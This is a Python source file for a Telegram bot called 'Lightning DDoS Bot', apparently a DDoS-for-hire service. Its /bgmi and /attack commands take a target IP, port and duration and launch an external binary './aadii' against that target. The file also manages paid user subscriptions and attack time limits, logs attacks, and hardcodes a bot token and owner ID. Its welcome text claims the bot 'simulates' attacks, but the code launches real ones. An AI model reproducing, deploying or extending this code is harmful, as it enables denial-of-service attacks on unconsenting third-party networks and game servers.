import telebot
import datetime
import os
import time
import logging
import re
from collections import defaultdict
import subprocess
from threading import Timer, Lock
import json
import atexit
import asyncio
import threading
import math

# Set up logging
logging.basicConfig(level=logging.INFO)

# Constants
MAX_ATTACK_DURATION = 240
USER_ACCESS_FILE = "user_access.txt"
ATTACK_LOG_FILE = "attack_log.txt"
OWNER_ID = "1302320722"
bot = telebot.TeleBot('7324603047:AAFAWcYakaJzHMVHPUDqVRN5jRZSNVGPvMs')

# Auto-convert backup file on first run
if not os.path.exists(USER_ACCESS_FILE) and os.path.exists("user_access_backup.txt"):
    logging.info("Converting backup file to user_access.txt")
    try:
        with open("user_access_backup.txt", "r") as backup, open(USER_ACCESS_FILE, "w") as main:
            for line in backup:
                parts = line.strip().split(",")
                if len(parts) >= 3:
                    main.write(f"{parts[0]},{parts[-1]}\n")
    except Exception as e:
        logging.error(f"Backup conversion failed: {e}")

def load_user_access():
    try:
        with open(USER_ACCESS_FILE, "r") as file:
            access = {}
            for line in file:
                parts = line.strip().split(",")
                if len(parts) >= 3:  # Handle backup format
                    user_id, expiration = parts[0], parts[-1]
                elif len(parts) == 2:  # Normal format
                    user_id, expiration = parts
                else:
                    continue
                
                try:
                    access[user_id] = datetime.datetime.fromisoformat(expiration)
                except ValueError:
                    logging.error(f"Invalid expiration format for user {user_id}")
            return access
    except Exception as e:
        logging.error(f"Error loading user access: {e}")
        return {}

# ----------------------
# Data Persistence Setup
# ----------------------
attack_limits = {}
user_cooldowns = {}
active_attacks = []
user_command_count = defaultdict(int)
last_command_time = {}
attacks_lock = Lock()

def save_persistent_data():
    data = {
        'attack_limits': attack_limits,
        'user_cooldowns': user_cooldowns
    }
    with open('persistent_data.json', 'w') as f:
        json.dump(data, f)

def load_persistent_data():
    try:
        with open('persistent_data.json', 'r') as f:
            data = json.load(f)
            attack_limits.update(data.get('attack_limits', {}))
            user_cooldowns.update(data.get('user_cooldowns', {}))
    except FileNotFoundError:
        pass

atexit.register(save_persistent_data)

# ----------------------
# Define send_final_message
# ----------------------
def send_final_message(attack):
    with attacks_lock:
        if attack in active_attacks:
            active_attacks.remove(attack)
    save_active_attacks()

# ----------------------
# Attack Persistence
# ----------------------
def load_active_attacks():
    global active_attacks
    try:
        with open('active_attacks.json', 'r') as f:
            attacks = json.load(f)
            for attack in attacks:
                attack['end_time'] = datetime.datetime.fromisoformat(attack['end_time'])
                remaining = (attack['end_time'] - datetime.datetime.now()).total_seconds()
                if remaining > 0:
                    with attacks_lock:
                        active_attacks.append(attack)
                    Timer(remaining, send_final_message, [attack]).start()
    except FileNotFoundError:
        pass

def save_active_attacks():
    with attacks_lock:
        attacks_to_save = [{
            'user_id': a['user_id'],
            'target': a['target'],
            'port': a['port'],
            'end_time': a['end_time'].isoformat(),
            'message_id': a.get('message_id')
        } for a in active_attacks]
    with open('active_attacks.json', 'w') as f:
        json.dump(attacks_to_save, f)

# ----------------------
# Asynchronous Event Loop Setup
# ----------------------
async_loop = asyncio.new_event_loop()
def start_async_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

threading.Thread(target=start_async_loop, args=(async_loop,), daemon=True).start()

# ----------------------
# Helper Functions
# ----------------------
def save_user_access():
    temp_file = f"{USER_ACCESS_FILE}.tmp"
    try:
        with open(temp_file, "w") as file:
            for user_id, expiration in user_access.items():
                file.write(f"{user_id},{expiration.isoformat()}\n")
        os.replace(temp_file, USER_ACCESS_FILE)
    except Exception as e:
        logging.error(f"Error saving user access: {e}")

def log_attack(user_id, target, port, duration):
    try:
        with open(ATTACK_LOG_FILE, "a") as log_file:
            log_file.write(f"{datetime.datetime.now()}: User {user_id} attacked {target}:{port} for {duration} seconds.\n")
    except Exception as e:
        logging.error(f"Error logging attack: {e}")

def is_valid_ip(ip):
    return re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip) is not None

def is_rate_limited(user_id):
    now = datetime.datetime.now()
    cooldown = user_cooldowns.get(user_id, 300)
    if user_id in last_command_time and (now - last_command_time[user_id]).seconds < cooldown:
        user_command_count[user_id] += 1
        return user_command_count[user_id] > 3
    else:
        user_command_count[user_id] = 1
        last_command_time[user_id] = now
    return False

user_access = load_user_access()
load_persistent_data()
load_active_attacks()

# ---------------------------
# Asynchronous Countdown Function
# ---------------------------
async def async_update_countdown(message, msg_id, start_time, duration, caller_id, target, port, attack_info):
    end_time = start_time + datetime.timedelta(seconds=duration)
    loop = asyncio.get_running_loop()
    while True:
        remaining = (end_time - datetime.datetime.now()).total_seconds()
        if remaining <= 0:
            break
        try:
            await loop.run_in_executor(None, lambda: bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg_id,
                text=f" 🚀𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐧🥶\n🎯𝐈𝐏:{target} \n⛱️️𝙋𝙤𝙧𝙩:{port} \n⌚𝐓𝐢ᴍᴇ:{time}\n JOIN OUR CHANNEL 👇🏻\n᚛ https://t.me/+KWXSknpfd4w2NmJl ᚜",
                parse_mode='Markdown'
            ))
        except Exception as e:
            logging.error(f"Async countdown update error: {e}")
        await asyncio.sleep(1)
    try:
        await loop.run_in_executor(None, lambda: bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg_id,
            text=f"""
✅ <b>ATTACK COMPLETED</b> ✅
🎯 <b>Target</b>: `{target}`
📡 <b>Port</b>: `{port}`
⏳ <b>Duration</b>: `{duration} seconds`
🔥 <b>Attack finished successfully!</b> 🔥
            """,
            parse_mode='Markdown'
        ))
    except Exception as e:
        logging.error(f"Async final message error: {e}")
    with attacks_lock:
        if attack_info in active_attacks:
            active_attacks.remove(attack_info)
    save_active_attacks()

# ---------------------------
# Bot Commands
# ---------------------------
@bot.message_handler(commands=['start'])
def start_command(message):
    welcome_message = """
🌟 Welcome to the <b>Lightning DDoS Bot</b>! 🌟

⚡️ With this bot, you can:
- Check your subscription status.
- Simulate powerful attacks responsibly.
- Manage access and commands efficiently.

🚀 Use <b>/help</b> to see the available commands and get started!

🛡️ For assistance, contact <a href="tg://user?id=6442837812">@user_x_dead</a>

<b>Note:</b> Unauthorized access is prohibited. Contact an admin if you need access.
    """
    bot.reply_to(message, welcome_message, parse_mode='HTML')

@bot.message_handler(commands=['bgmi', 'attack'])
def handle_bgmi(message):
    logging.info("BGMI command received")
    caller_id = str(message.from_user.id)
    # Enforce access check for all chats (for non-owner users)
    if caller_id != OWNER_ID and (caller_id not in user_access or user_access[caller_id] < datetime.datetime.now()):
        bot.reply_to(message, "❌ You are not authorized to use this bot or your access has expired. Please contact an admin.")
        return
    if is_rate_limited(caller_id):
        bot.reply_to(message, "🚨 Too many requests!")
        return
    command = message.text.split()
    if len(command) != 4 or not command[3].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/bgmi <target> <port> <duration>`", parse_mode='Markdown')
        return
    target, port, duration = command[1], command[2], int(command[3])
    if not is_valid_ip(target):
        bot.reply_to(message, "❌ Invalid target IP! Please provide a valid IP address.")
        return
    if not port.isdigit() or not (1 <= int(port) <= 65535):
        bot.reply_to(message, "❌ Invalid port! Please provide a port number between 1 and 65535.")
        return
    if duration > MAX_ATTACK_DURATION:
        bot.reply_to(message, f"⚠️ Maximum attack duration is {MAX_ATTACK_DURATION} seconds.")
        return
    if caller_id in attack_limits and duration > attack_limits[caller_id]:
        bot.reply_to(message, f"⚠️ Your maximum allowed attack duration is {attack_limits[caller_id]} seconds.")
        return
    current_active = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]
    if len(current_active) >= 1:
        bot.reply_to(message, "🚨 Maximum of 1 concurrent attack allowed. Please wait for the current attack to finish before launching a new one.")
        return
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    attack_info = {'user_id': caller_id, 'target': target, 'port': port, 'end_time': attack_end_time}
    
    try:
        subprocess.Popen(
             ["./aadii", target, str(port), str(duration)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception as e:
        logging.error(f"Subprocess error: {e}")
        bot.reply_to(message, "🚨 An error occurred while executing the attack command.")
        return

    with attacks_lock:
        active_attacks.append(attack_info)
    save_active_attacks()
    log_attack(caller_id, target, port, duration)
    
    msg = bot.send_message(
        message.chat.id,
        f"""
⚡️🔥 <b>ATTACK DEPLOYED</b> 🔥⚡️

👑 <b>Commander</b>: `{caller_id}`
🎯 <b>Target Locked</b>: `{target}`
📡 <b>Port Engaged</b>: `{port}`
⏳ <b>Time Remaining</b>: `{duration} seconds`
⚔️ <b>Weapon</b>: `BGMI Protocol`
🔥 <b>The wrath is unleashed. May the network shatter!</b> 🔥
        """,
        parse_mode='Markdown'
    )
    attack_info['message_id'] = msg.message_id
    save_active_attacks()
    asyncio.run_coroutine_threadsafe(
        async_update_countdown(message, msg.message_id, datetime.datetime.now(), duration, caller_id, target, port, attack_info),
        async_loop
    )

@bot.message_handler(commands=['when'])
def when_command(message):
    logging.info("When command received")
    global active_attacks
    active_attacks = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]
    if not active_attacks:
        reply = bot.reply_to(message, "No attacks are currently in progress.")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
        return
    active_attack_message = "Current active attacks:\n"
    for attack in active_attacks:
        target = attack['target']
        port = attack['port']
        time_remaining = max((attack['end_time'] - datetime.datetime.now()).total_seconds(), 0)
        active_attack_message += f"🌐 Target: `{target}`, 📡 Port: `{port}`, ⏳ Remaining Time: {int(time_remaining)} seconds\n"
    reply = bot.reply_to(message, active_attack_message)
    Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()

@bot.message_handler(commands=['help'])
def help_command(message):
    logging.info("Help command received")
    help_text = """
🚀 <b>Available Commands:</b>
- <b>/start</b> - 🎉 Get started with a warm welcome message!
- <b>/help</b> - 📖 Discover all the amazing things this bot can do for you!
- <b>/bgmi &lt;target&gt; &lt;port&gt; &lt;duration&gt;</b> - ⚡ Launch an attack.
- <b>/when</b> - ⏳ Check the remaining time for current attacks.
- <b>/grant &lt;user_id&gt; &lt;duration&gt;</b> - Grant user access (Owner only). (Use "1d" for 1 day or "12h" for 12 hours)
- <b>/revoke &lt;user_id&gt;</b> - Revoke user access (Owner only).
- <b>/attack_limit &lt;user_id&gt; &lt;max_duration&gt;</b> - Set max attack duration (Owner only).
- <b>/status</b> - Check your subscription status.
- <b>/list_users</b> - List all users with access (Owner only).
- <b>/backup</b> - Backup user access data (Owner only).
- <b>/download_backup</b> - Download user data (Owner only).
- <b>/set_cooldown &lt;user_id&gt; &lt;minutes&gt;</b> - Set a user's cooldown time in minutes (minimum 1 minute, Owner only).

📋 <b>Usage Notes:</b>
- Replace <i>&lt;user_id&gt;</i>, <i>&lt;target&gt;</i>, <i>&lt;port&gt;</i>, <i>&lt;duration&gt;</i>, and <i>&lt;minutes&gt;</i> with the appropriate values.
- Need help? Contact the owner for permissions or support.
    """
    try:
        bot.reply_to(message, help_text, parse_mode='HTML')
    except telebot.apihelper.ApiTelegramException as e:
        logging.error(f"Telegram API error: {e}")
        bot.reply_to(message, "🚨 An error occurred while processing your request. Please try again later.")

@bot.message_handler(commands=['grant'])
def grant_command(message):
    logging.info("Grant command received")
    caller = str(message.from_user.id)
    if caller != OWNER_ID:
        reply = bot.reply_to(message, "❌ You are not authorized to use this command.")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
        return
    command = message.text.split()
    if len(command) != 3:
        reply = bot.reply_to(message, "Invalid format! Use: `/grant <user_id> <duration>` (e.g., 1d for 1 day or 12h for 12 hours)")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
        return
    target_user = command[1]
    duration_str = command[2].lower()
    try:
        if duration_str.endswith("h"):
            hours = int(duration_str[:-1])
            delta = datetime.timedelta(hours=hours)
        elif duration_str.endswith("d"):
            days = int(duration_str[:-1])
            delta = datetime.timedelta(days=days)
        elif duration_str.isdigit():
            days = int(duration_str)
            delta = datetime.timedelta(days=days)
        else:
            reply = bot.reply_to(message, "Invalid duration format! Use a number followed by 'd' for days or 'h' for hours.")
            Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
            return
    except ValueError:
        reply = bot.reply_to(message, "Invalid duration value!")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
        return
    expiration_date = datetime.datetime.now() + delta
    user_access[target_user] = expiration_date
    save_user_access()
    reply = bot.reply_to(message, f"✅ User {target_user} granted access until {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}.")
    Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()

@bot.message_handler(commands=['revoke'])
def revoke_command(message):
    logging.info("Revoke command received")
    caller = str(message.from_user.id)
    if caller != OWNER_ID:
        reply = bot.reply_to(message, "❌ You are not authorized to use this command.")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
        return
    command = message.text.split()
    if len(command) != 2:
        reply = bot.reply_to(message, "Invalid format! Use: `/revoke <user_id>`")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
        return
    target_user = command[1]
    if target_user in user_access:
        del user_access[target_user]
        save_user_access()
        reply = bot.reply_to(message, f"✅ User {target_user} access has been revoked.")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()
    else:
        reply = bot.reply_to(message, f"❌ User {target_user} does not have access.")
        Timer(10, lambda: bot.delete_message(reply.chat.id, reply.message_id)).start()

@bot.message_handler(commands=['attack_limit'])
def attack_limit_command(message):
    logging.info("Attack limit command received")
    caller = str(message.from_user.id)
    if caller != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    command = message.text.split()
    if len(command) != 3 or not command[2].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/attack_limit <user_id> <max_duration>`")
        return
    target_user, max_duration = command[1], int(command[2])
    attack_limits[target_user] = max_duration
    save_persistent_data()
    bot.reply_to(message, f"✅ User {target_user} can now launch attacks up to {max_duration} seconds.")

@bot.message_handler(commands=['list_users'])
def list_users_command(message):
    logging.info("List users command received")
    caller = str(message.from_user.id)
    if caller != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    now = datetime.datetime.now()
    lines = []
    for uid, exp in user_access.items():
        delta = exp - now
        total_seconds = delta.total_seconds()
        if total_seconds < 0:
            continue
        days = delta.days
        hours, remainder = divmod(delta.seconds, 3600)
        minutes, _ = divmod(remainder, 60)
        try:
            chat_info = bot.get_chat(uid)
            name = chat_info.first_name if chat_info.first_name else uid
        except Exception:
            name = uid
        if days > 0:
            line = f"{name} (User ID: {uid}) - {days} day(s) {hours} hour(s) {minutes} minute(s) left"
        else:
            line = f"{name} (User ID: {uid}) - {hours} hour(s) {minutes} minute(s) left"
        lines.append(line)
    reply_text = "Users:\n" + "\n".join(lines)
    bot.reply_to(message, reply_text)

@bot.message_handler(commands=['backup'])
def backup_command(message):
    logging.info("Backup command received")
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    with open("user_access_backup.txt", "w") as backup_file:
        for uid, exp in user_access.items():
            try:
                chat_info = bot.get_chat(uid)
                name = chat_info.first_name if chat_info.first_name else uid
            except Exception as e:
                logging.error(f"Error retrieving chat info for {uid}: {e}")
                name = uid
            backup_file.write(f"{uid},{name},{exp.isoformat()}\n")
    bot.reply_to(message, "✅ User access data has been backed up.")
    
@bot.message_handler(commands=['download_backup'])
def download_backup(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    with open("user_access_backup.txt", "rb") as backup_file:
        bot.send_document(message.chat.id, backup_file)

@bot.message_handler(commands=['set_cooldown'])
def set_cooldown_command(message):
    logging.info("Set cooldown command received")
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    command = message.text.split()
    if len(command) != 3 or not command[2].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/set_cooldown <user_id> <minutes>`", parse_mode='Markdown')
        return
    target_user_id = command[1]
    new_cooldown_minutes = int(command[2])
    if new_cooldown_minutes < 1:
        new_cooldown_minutes = 1
    new_cooldown_seconds = new_cooldown_minutes * 60
    user_cooldowns[target_user_id] = new_cooldown_seconds
    save_persistent_data()
    bot.reply_to(message, f"✅ Cooldown for user {target_user_id} set to {new_cooldown_minutes} minute(s).")

@bot.message_handler(commands=['status'])
def status_command(message):
    logging.info("Status command received")
    user_id = str(message.from_user.id)
    if user_id in user_access:
        expiration = user_access[user_id]
        bot.reply_to(message, f"✅ Your access is valid until {expiration.strftime('%Y-%m-%d %H:%M:%S')}.")
    else:
        bot.reply_to(message, "❌ You do not have access. Contact the owner.")

# Polling with retry logic
while True:
    try:
        bot.polling(none_stop=True, interval=0, allowed_updates=["message"])
    except Exception as e:
        logging.error(f"Polling error: {e}")
        time.sleep(5)
